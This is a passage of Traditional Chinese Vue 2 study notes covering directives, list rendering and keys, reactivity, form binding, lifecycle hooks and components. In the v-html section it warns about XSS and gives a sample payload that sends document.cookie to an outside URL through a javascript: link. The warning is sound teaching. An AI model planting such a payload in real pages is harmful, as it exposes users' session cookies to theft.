<li>具體代碼：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div v-if=&quot;n === 1&quot;&gt;Angular&lt;/div&gt;</span><br><span class="line">&lt;div v-else-if=&quot;n === 2&quot;&gt;React&lt;/div&gt;</span><br><span class="line">&lt;div v-else-if=&quot;n === 3&quot;&gt;Vue&lt;/div&gt;</span><br><span class="line">&lt;div v-else&gt;haha&lt;/div&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>v-show</code></p>
<ul>
<li>適用於：切換頻率較高的場景</li>
<li>特點：不展示的DOM元素不會被移除，僅僅是使用樣式隱藏</li>
<li>具體代碼：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h2 v-show=&quot;false&quot;&gt;Hello&lt;/h2&gt;</span><br><span class="line">&lt;h2 v-show=&quot;1 === 1&quot;&gt;Hello&lt;/h2&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>備註：使用<code>v-if</code>時，元素可能無法獲取到，而使用<code>v-show</code>一定可以獲取到</p>
</li>
</ol>
<h2 id="列表渲染-v-for"><a href="#列表渲染-v-for" class="headerlink" title="列表渲染 v-for"></a>列表渲染 <code>v-for</code></h2><ol>
<li><p>簡介：</p>
<ul>
<li>用於展示列表數據</li>
<li>可遍歷：數組、對象、字符串、指定次數</li>
<li>語法：<code>v-for=&quot;(item, index) in obj&quot; :key=&quot;index&quot;</code></li>
</ul>
</li>
<li><p>遍歷數組</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;li v-for=&quot;(p,index) in persons&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125; -- &#123;&#123;index&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">persons</span>:[</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">19</span>&#125;,</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;John&#x27;</span>, <span class="attr">age</span>:<span class="number">20</span>&#125;,</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;Jack&#x27;</span>, <span class="attr">age</span>:<span class="number">21</span>&#125;,</span><br><span class="line">        ],</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>遍歷對象</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;li v-for=&quot;(value,k) in car&quot; :key=&quot;k&quot;&gt;</span><br><span class="line">    &#123;&#123;k&#125;&#125; -- &#123;&#123;value&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>:&#123;     </span><br><span class="line">        <span class="attr">car</span>:&#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&#x27;Porsche&#x27;</span>,</span><br><span class="line">            <span class="attr">price</span>:<span class="string">&#x27;10M&#x27;</span>,</span><br><span class="line">            <span class="attr">color</span>:<span class="string">&#x27;Black&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>遍歷字符串（少用）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;li v-for=&quot;(char,index) in str&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &#123;&#123;char&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">str</span>:<span class="string">&#x27;Hello&#x27;</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>遍歷指定次數（少用）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;li v-for=&quot;(number,index) in 10&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &#123;&#123;number&#125;&#125; - &#123;&#123;index&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="key的內部原理"><a href="#key的內部原理" class="headerlink" title="key的內部原理"></a>key的內部原理</h2><ol>
<li><p>虛擬DOM中<code>key</code>的作用：</p>
<ul>
<li>key是虛擬DOM對象的標識，當狀態中的數據發生變化時，Vue會根據「新數據」生成「新的虛擬DOM」</li>
<li>隨後Vue進行「新虛擬DOM」與「舊虛擬DOM」的差異比較(diff Algorithm)</li>
</ul>
</li>
<li><p>Diff Algorithm 對比規則：</p>
<ul>
<li><p>舊虛擬DOM中<font color="#f54747">找到</font>與新虛擬DOM相同的<code>key</code></p>
<ol>
<li>若虛擬DOM中內容<font color="#f54747">沒變</font>，直接使用之前的真實DOM</li>
<li>若虛擬DOM中內容<font color="#f54747">有變</font>，則聲稱新的真實DOM，隨後替換掉頁面中之前的真實DOM</li>
</ol>
</li>
<li><p>舊虛擬DOM中<font color="#f54747">找不到</font>與新虛擬DOM相同的<code>key</code></p>
<ul>
<li>創建新的真實DOM，隨後渲染到頁面</li>
</ul>
</li>
</ul>
</li>
<li><p>用<code>index</code>作為<code>key</code>可能引發的問題：</p>
<ol>
<li><p>若對數據進行：逆序添加、逆序刪除等破壞順序的操作：</p>
<ul>
<li>會產生沒有必要的真實DOM更新 &#x3D;&gt; 界面效果沒問題，但效率低</li>
</ul>
</li>
<li><p>如果結構中還包括輸入類的DOM：</p>
<ul>
<li>會產生錯誤DOM更新 &#x3D;&gt; 介面有問題</li>
</ul>
</li>
</ol>
</li>
<li><p>開發中如何選擇<code>key</code>：</p>
<ol>
<li>最好使用每條數據的唯一標識作為<code>key</code>，比如<code>id</code>、手機號碼、身分證號碼、學生證號碼等唯一值</li>
<li>如果<font color="#f54747">不存在對數據的逆序添加、逆序刪除等破壞順序的操作，僅用於渲染列表用於展示</font><ul>
<li>使用<code>index</code>作為<code>key</code>是沒有問題的</li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="Vue監測原理"><a href="#Vue監測原理" class="headerlink" title="Vue監測原理"></a>Vue監測原理</h2><ol>
<li><p>更新時的問題：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;li v-for=&quot;(p,index) in persons&quot; :key=&quot;p.id&quot;&gt;</span><br><span class="line">    &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>當數據是保存在一個對象裡，如果直接修改對象數據，則頁面也會更新數據</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">persons</span>[<span class="number">0</span>].<span class="property">name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>然而，如果修改整個對象，則頁面<font color="#f54747">不會更新數據</font></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">persons</span>[<span class="number">0</span>] = &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">50</span>&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Vue監測對象中的數據：</p>
<ul>
<li>通過<code>setter</code>實現監視，且要再<code>new Vue</code>時就傳入要監測的數據</li>
<li>對象中後追加的屬性，Vue默認不做響應式處理<font color="#f54747">（後追加的屬性並沒有添加<code>setter</code>）</font></li>
<li>如需要給後添加的屬性做響應式，則需要使用一下API：<ol>
<li><code>Vue.set(target, key, value)</code></li>
<li><code>vm.$set(target, key, value)</code></li>
</ol>
</li>
<li>具體代碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="title function_">addGender</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Vue</span>.<span class="title function_">set</span>(<span class="variable language_">this</span>.<span class="property">students</span>, <span class="string">&#x27;gender&#x27;</span>, <span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">        <span class="variable language_">this</span>.$set(<span class="variable language_">this</span>.<span class="property">students</span>, <span class="string">&#x27;gender&#x27;</span>, <span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Vue監測數組中的數據：</p>
<ul>
<li>通過包裹數組更新元素的方法實現，本質包裹裡就做了兩件事：<ol>
<li>調用原生對應的方法對數組進行更新</li>
<li>重新解析模板，進而更新頁面</li>
</ol>
</li>
</ul>
</li>
<li><p>在Vue修改數組中的某個元素一定要用如下方法：</p>
<ul>
<li>使用以下API：<code>push()</code>, <code>pop()</code>, <code>shift()</code>, <code>unshift()</code>, <code>splice()</code>, <code>sort()</code>, <code>reverse()</code></li>
<li><code>Vue.set()</code> 或 <code>vm.$set</code></li>
</ul>
</li>
<li><p>備註：<font color="#f54747"><code>Vue.set()</code>和<code>vm.$set</code>不可以給<code>vm</code>或<code>vm</code>的跟數據對象 添加屬性！！！</font></p>
</li>
</ol>
<h2 id="收集表單數據"><a href="#收集表單數據" class="headerlink" title="收集表單數據"></a>收集表單數據</h2><ol>
<li><p>Vue對輸入框數據的收集：</p>
<ol>
<li><p><code>&lt;input type=&quot;text&quot;/&gt;</code></p>
<ul>
<li><code>v-model</code>收集的是<code>value</code>值，而用戶輸入的就是<code>value</code>值</li>
</ul>
</li>
<li><p><code>&lt;input type=&quot;radio&quot;/&gt;</code></p>
<ul>
<li><code>v-model</code>收集的是<code>value</code>值，而要給標籤配置<code>value</code>值</li>
</ul>
</li>
<li><p><code>&lt;input type=&quot;checkbox&quot;/&gt;</code></p>
<ul>
<li><p>如果沒有配置<code>input</code>的<code>value</code>屬性</p>
<ul>
<li>則<code>v-model</code>收集的是<code>checked</code>的布爾值</li>
</ul>
</li>
<li><p>如果有配置<code>input</code>的<code>value</code>屬性</p>
<ol>
<li><code>v-model</code>的初始值是非數組，那麼收集的就是<code>checked</code>的布爾值</li>
<li><code>v-model</code>的初始值是數組，那麼收集的就是<code>value</code>組成的數組</li>
</ol>
</li>
</ul>
</li>
</ol>
</li>
<li><p><code>v-model</code>的三個修飾符：</p>
<ol>
<li><code>lazy</code>：失去焦點再收集數據</li>
<li><code>number</code>：輸入字符串轉為有效數字</li>
<li><code>trim</code>：輸入收尾空格過濾</li>
</ol>
<ul>
<li>語法：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 失去焦點時，userInfo.other收集輸入框數據 --&gt;</span><br><span class="line">&lt;textarea v-model.lazy=&quot;userInfo.other&quot;&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="過濾器（已刪除）"><a href="#過濾器（已刪除）" class="headerlink" title="過濾器（已刪除）"></a>過濾器（已刪除）</h2><ol>
<li><p>定義：對要顯示的數據進行特定的格式化後再顯示</p>
</li>
<li><p>語法：</p>
<ol>
<li>註冊過濾器：<code>Vue.filter(name, callback)</code> 或 <code>new Vue(filters:&#123;&#125;)</code></li>
<li>使用過濾器：<code>&#123;&#123;xxx | filterName&#125;&#125;</code> 或 <code>v-bind:屬性=&quot;xxx | filterName&quot;</code></li>
</ol>
</li>
<li><p>備註：</p>
<ol>
<li>過濾器可以接受額外參數，多個過濾器也可以串連</li>
<li>並沒有改變原本的數據，會產生新的對應數據</li>
</ol>
</li>
</ol>
<h2 id="Vue內置指令"><a href="#Vue內置指令" class="headerlink" title="Vue內置指令"></a>Vue內置指令</h2><ol>
<li><p><code>v-text</code></p>
<ul>
<li><p>作用：向其所在的節點中渲染文本內容</p>
</li>
<li><p>與插值語法的區別：<font color="#f54747"><code>v-text</code>會替換掉節點中的內容，插值語法則不會</font></p>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div v-text=&quot;&#x27;Hello, &#x27; + name&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    data:&#123;</span><br><span class="line">        name:&#x27;Donald&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>v-html</code></p>
<ul>
<li><p>作用：向指定節點中渲染包含html結構的內容</p>
</li>
<li><p>與插值語法的區別：</p>
<ol>
<li><code>v-html</code>會替換掉節點中的所有內容</li>
<li><code>v-html</code>可以識別<code>html</code>結構</li>
</ol>
</li>
<li><p><font color="#f54747">嚴重注意：v-html有安全性問題：</font></p>
<ol>
<li>在網站上動態渲任意HTML是非常危險的，容易導致XSS攻擊</li>
<li>一定要在可信的內容上使用v-html，永遠不要再用戶提交的內容上使用</li>
</ol>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div v-html=&quot;str&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div v-html=&quot;str2&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    data:&#123;</span><br><span class="line">        str: &#x27;&lt;h3&gt;Hello World&lt;/h3&gt;&#x27;,</span><br><span class="line">        // 竊取用戶cookie</span><br><span class="line">        str2: &#x27;&lt;a href=javascript:location.href=&quot;http://www.google.com?&quot; + document.cookie&gt;Click Me&lt;/a&gt;&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>v-cloak</code></p>
<ul>
<li><p>作用：</p>
<ul>
<li>本質是一個特殊屬性，Vue實例創建完畢並接管容器後，會刪除<code>v-cloak</code>屬性</li>
<li>使用css配合<code>v-cloak</code>可以解決網速慢時頁面展示出的<code>&#123;&#123;xxx&#125;&#125;</code>問題</li>
</ul>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    [v-cloak]&#123;</span><br><span class="line">        /* 避免出現的樣式丟失問題 */</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>v-once</code></p>
<ul>
<li><p>作用：</p>
<ul>
<li><code>v-once</code>所在節點在初次動態渲染後，就視為靜態內容了</li>
<li>以後數據的改變不會引起<code>v-once</code>所在結構的更新，可以用於優化性能</li>
</ul>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &#123;&#123;n&#125;&#125;變成靜態內容 --&gt;</span><br><span class="line">&lt;h2 v-once&gt;initialized value of n = &#123;&#123;n&#125;&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>v-pre</code></p>
<ul>
<li><p>作用：</p>
<ul>
<li>跳過其所在節點的編譯過程</li>
<li>可以利用它跳過：沒有使用指令語法、沒有使用插值語法的節點，會加快編譯</li>
</ul>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &#123;&#123;n&#125;&#125;被跳過，不會動態渲染 --&gt;</span><br><span class="line">&lt;h2 v-pre&gt;current value of n = &#123;&#123;n&#125;&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="自定義指令"><a href="#自定義指令" class="headerlink" title="自定義指令"></a>自定義指令</h3><ol>
<li><p>定義語法：</p>
<ol>
<li><p>局部指令：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">directives</span>:&#123;指令名:配置對象&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="title function_">directives</span>(<span class="params"></span>)&#123;指令名:回調函數&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li>案例：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 案例: 定義一個v-enlarge指令，和v-text功能類似，會把綁定的數值放大10倍 --&gt;</span><br><span class="line">&lt;h2&gt;10n = &lt;span v-enlarge=&quot;n&quot;&gt;&lt;/span&gt;&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    directives:&#123;</span><br><span class="line">        enlarge(element,binding)&#123;</span><br><span class="line">            element.innerText = binding.value * 10</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>全局指令：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;指令名&#x27;</span>, 配置對象)</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;指令名&#x27;</span>, 回調函數)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>配置對象中常用的3個回調：</p>
<ol>
<li><code>bind</code>：指令與元素成功綁定時</li>
<li><code>inserted</code>：指令所在元素被插入頁面時</li>
<li><code>update</code>：指令所在模板結構被重新解析時</li>
</ol>
<ul>
<li>案例：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 需求2: 定義一個v-fbind指令，和v-bind功能類似，但可以讓所綁定的input元素默認獲取焦點 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-fbind:value=&quot;n&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    directives:&#123;</span><br><span class="line">        fbind:&#123;</span><br><span class="line">            // 指令與元素成功綁定時（初次）</span><br><span class="line">            bind(element, binding)&#123;</span><br><span class="line">                element.value = binding.value</span><br><span class="line">            &#125;,</span><br><span class="line">            // 指令所在元素在插入頁面時</span><br><span class="line">            inserted(element, binding)&#123;</span><br><span class="line">                element.focus()</span><br><span class="line">            &#125;,</span><br><span class="line">            // 指令所在的模板被重新解析時</span><br><span class="line">            update(element, binding)&#123;</span><br><span class="line">                element.value = binding.value</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>備註：</p>
<ol>
<li>指令定義時不加<code>v-</code>，但使用時要加<code>v-</code>:</li>
<li>指令名如果是多個單詞，要使用 kebab-case 命名方式，不要用 camelCase 命名方式</li>
</ol>
</li>
</ol>
<h2 id="生命週期"><a href="#生命週期" class="headerlink" title="生命週期"></a>生命週期</h2><ol>
<li><p>簡介：</p>
<ul>
<li>Vue在關鍵時刻幫我們調用的一些特殊名稱的函數</li>
<li>生命週期函數的名字不可更改，但函數的具體內容是程序員根據要求編寫的</li>
<li>生命週期函數中的<code>this</code>指向是<code>vm</code>或組件實例對象</li>
<li>生命週期：<code>beforeCreate</code> -&gt; <code>created</code> -&gt; <code>beforeMount</code>  -&gt; <code>mounted</code>  -&gt; <code>beforeUpdated</code>  -&gt; <code>updated</code>  -&gt; <code>beforeDestoryed</code>  -&gt; <code>destoryed</code></li>
<li>圖示：<img src="https://p.ipic.vip/jmyx89.png" width="600px"/></li>
</ul>
</li>
<li><p>分析聲明週期：</p>
<ol>
<li><p><code>beforeCreate()</code></p>
<ul>
<li>初始化：生命週期、事件</li>
<li>無法通過<code>vm</code>訪問<code>data</code>中的數據和<code>methods</code>中的方法</li>
</ul>
</li>
<li><p><code>created()</code></p>
<ul>
<li>初始化：數據監聽、數據代理</li>
<li>可以通過<code>vm</code>訪問<code>data</code>中的數據和<code>methods</code>中的方法</li>
</ul>
</li>
<li><p><code>beforeMount()</code></p>
<ul>
<li>解析模板，生成虛擬DOM，此時頁面還<font color="#f54747">不能顯示解析好的內容</font></li>
<li>頁面呈現的是<font color="#f54747">未經Vue編譯的DOM結構</font></li>
<li>所有對DOM的操作，最終都沒有效果</li>
</ul>
</li>
<li><p><code>mounted()</code></p>
<ul>
<li>將內存中的 虛擬DOM 轉為 真實DOM 插入頁面</li>
<li>頁面呈現的是<font color="#f54747">經過Vue編譯的DOM結構</font></li>
<li>一般在此進行：開始定時器、發送網絡請求、綁定自定義事件等初始化操作</li>
</ul>
</li>
<li><p><code>beforeUpdate()</code></p>
<ul>
<li>此時數據是新的，但是頁面是舊的，<font color="#f54747">數據和頁面尚未保持同步</font></li>
</ul>
</li>
<li><p><code>updated()</code></p>
<ul>
<li>根據新數據生成新的虛擬DOM，隨後與舊的虛擬DOM進行<code>diff</code>算法比較，最終更新頁面</li>
<li>此時數據和頁面都是新的，<font color="#f54747">數據和頁面同步</font></li>
</ul>
</li>
<li><p><code>beforeDestroyed()</code></p>
<ul>
<li>此時<code>vm</code>中的所有<code>data</code>、<code>methods</code>都是可用的，但<font color="#f54747">不會進行頁面的更新</font></li>
<li>一般在此進行：關閉定時器等收尾操作</li>
</ul>
</li>
<li><p><code>destroyed()</code></p>
<ul>
<li>刪除所有內置的數據監聽和數據代理</li>
</ul>
</li>
</ol>
</li>
<li><p>常用生命週期鉤子：</p>
<ol>
<li><code>mounted()</code> <ul>
<li>發送<code>ajax</code>請求、啟動定時器、綁定自定義事件、訂閱消息等<font color="#f54747">初始化操作</font></li>
</ul>
</li>
<li><code>beforeDestroy()</code><ul>
<li>清除定時器、解綁自定義事件、取消訂閱信息等<font color="#f54747">收尾工作</font></li>
</ul>
</li>
</ol>
</li>
<li><p>關於銷毀Vue實例：</p>
<ol>
<li>銷毀後借助Vue的開發者工具看不到任何信息</li>
<li>銷毀後自定義事件會失效，但<font color="#f54747">原生DOM事件依然有效</font></li>
<li>一般不會在<code>beforeDestroy</code>操作數據，因為即便操作數據，也不會觸發更新流程</li>
</ol>
</li>
</ol>
<h2 id="組件化編程"><a href="#組件化編程" class="headerlink" title="組件化編程"></a>組件化編程</h2><ol>
<li><p>傳統方式編寫應用：</p>
<ol>
<li><p>案例一、頂部、導航、內容、底部</p>
<ul>
<li>結構：<ul>
<li>1個HTML，負責頁面結構</li>
<li>添加引入4個CSS，負責管理不同區域</li>
<li>添加引入4個JS，負責各個區域的交互</li>
</ul>
</li>
</ul>
</li>
<li><p>案例二、頂部、商品列表、底部</p>
<ul>
<li>結構：<ul>
<li>1個新的HTML，「複製貼上」案例一中 頂部與底部的結構，並添加商品列表的結構</li>
<li>引入案例一中重複的頂部與底部CSS樣式</li>
<li>引入案例一中重複的頂部與底部JS</li>
<li>添加引入1個CSS樣式和JS交互，負責商品列表區域</li>
</ul>
</li>
</ul>
</li>
<li><p>存在問題：</p>
<ol>
<li>依賴關係混亂、不好維護</li>
<li>代碼複用率不高</li>
</ol>
</li>
</ol>
</li>
<li><p>組件方式編寫應用：</p>
<ol>
<li><p>案例一、頂部、導航、內容、底部</p>
<ul>
<li>分開四個不同組件：<ul>
<li><code>header</code>組件，包含：實現頂部功能所對應的樣式(CSS)、結構(HTML片斷)及交互(JS)</li>
<li><code>navigator</code>組件</li>
<li><code>content</code>組件</li>
<li><code>footer</code>組件</li>
</ul>
</li>
</ul>
</li>
<li><p>案例二、頂部、商品列表、底部</p>
<ul>
<li>把重複應用的組件引入</li>
<li>再新增<code>list</code>組件，裏面包含實現其功能的樣式、結構及交互，並且包含獨特的，如字體、音頻等</li>
</ul>
</li>
</ol>
</li>
<li><p>組件化編程思路：</p>
<ol>
<li><p>拆分靜態組件：組件按照<font color="#f54747">功能點</font>拆分，命名不要與html元素衝突</p>
</li>
<li><p>實現動態組件：考慮好數據存放的位置，數據是一個組件在用，還是一些組件在用：</p>
<ul>
<li>一個組件在用：放在組件自身即可</li>
<li>多個組件在用：放在他們共同父組件上（狀態提升）</li>
</ul>
</li>
<li><p>實現交互：從綁定事件開始</p>
</li>
</ol>
</li>
<li><p>組件與模塊：</p>
<ol>
<li><p>模塊</p>
<ul>
<li>定義：向外提供特定功能的JS程序</li>
<li>原因：JS文件很多很複雜</li>
<li>作用：複用JS、簡化JS編程，提高JS運行效率</li>
</ul>
</li>
<li><p>組件</p>
<ul>
<li>定義：實現應用中<font color="#f54747">局部功能代碼和資源的集合</font></li>
<li>原因：一個界面的功能很複雜</li>
<li>作用：複寫編碼、簡化項目編碼，提高運行效率</li>
</ul>
</li>
</ol>
</li>
<li><p>組件化與模塊化</p>
<ol>
<li><p>模塊化</p>
<ul>
<li>當應用中的JS以模塊化形式編寫的，那這個應用就是一個模塊化的應用（把JS按模塊化的標準拆分）</li>
</ul>
</li>
<li><p>組件化</p>
<ul>
<li>當應用中的功能都是多組件的方式來編寫的，那這個應用就是一個組件化的應用（按照不同功能點來拆分）</li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="非單文件組件"><a href="#非單文件組件" class="headerlink" title="非單文件組件"></a>非單文件組件</h2><ol>
<li><p>Vue中使用組件的三大步驟：</p>
<ol>
<li><p>定義一個組件：</p>
<ul>
<li>使用<code>Vue.extend(options)</code>創建<ul>
<li><code>options</code>和<code>new Vue(options)</code>時傳入的那個<code>options</code>幾乎一樣</li>
<li>區別：<ol>
<li><code>el</code>不要寫，因為最終所有組件都要經過一個<code>vm</code>管理，由<code>vm</code>中的<code>el</code>決定服務哪個容器</li>
<li><code>data</code>必須寫成函數<code>data()&#123;return&#123;&#125;&#125;</code>，避免組件被複用時數據存在引用關係（儲存為同一地址）</li>
</ol>
</li>
<li>備註：使用<code>template</code>可以配置組件結構  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> student = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;Student Name: &#123;&#123;studentName&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;Student Address: &#123;&#123;age&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">data</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">studentName</span>:<span class="string">&#x27;Donald&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>:<span class="number">19</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>註冊組件：</p>
<ol>
<li><p>局部註冊：靠<code>new Vue</code>的時候傳入<code>components</code>選項</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;</span><br><span class="line">        school,</span><br><span class="line">        student</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>全局註冊：靠<code>Vue.component(&#39;組件名&#39;, 組件)</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;school&#x27;</span>, school)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>使用組件（組件標籤）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;組件名&gt;&lt;/組件名&gt;</span><br><span class="line">&lt;school&gt;&lt;/school&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>使用組件注意事項</p>
<ol>
<li><p>組件命名方式：</p>
<ol>
<li><p>一個單詞組成：</p>
<ul>
<li>第一種寫法：首字母大寫<code>School</code></li>
<li>第二種寫法：首字母小寫<code>school</code></li>
</ul>
</li>
<li><p>多個單詞組成：</p>
<ul>
<li>第一種寫法：kebab-case命名<code>my-school</code></li>
<li>第二種寫法：CamelCase命名<code>MySchool</code>（需要Vue腳手架支持）</li>
</ul>
</li>
<li><p>備註：</p>
<ul>
<li>組件名儘可能迴避HTML中已有的元素名稱，例如<code>h2</code>、<code>H2</code></li>
<li>可以使用<code>name</code>配置項指定組件在開發者工具中呈現的名字</li>
</ul>
</li>
</ol>
</li>
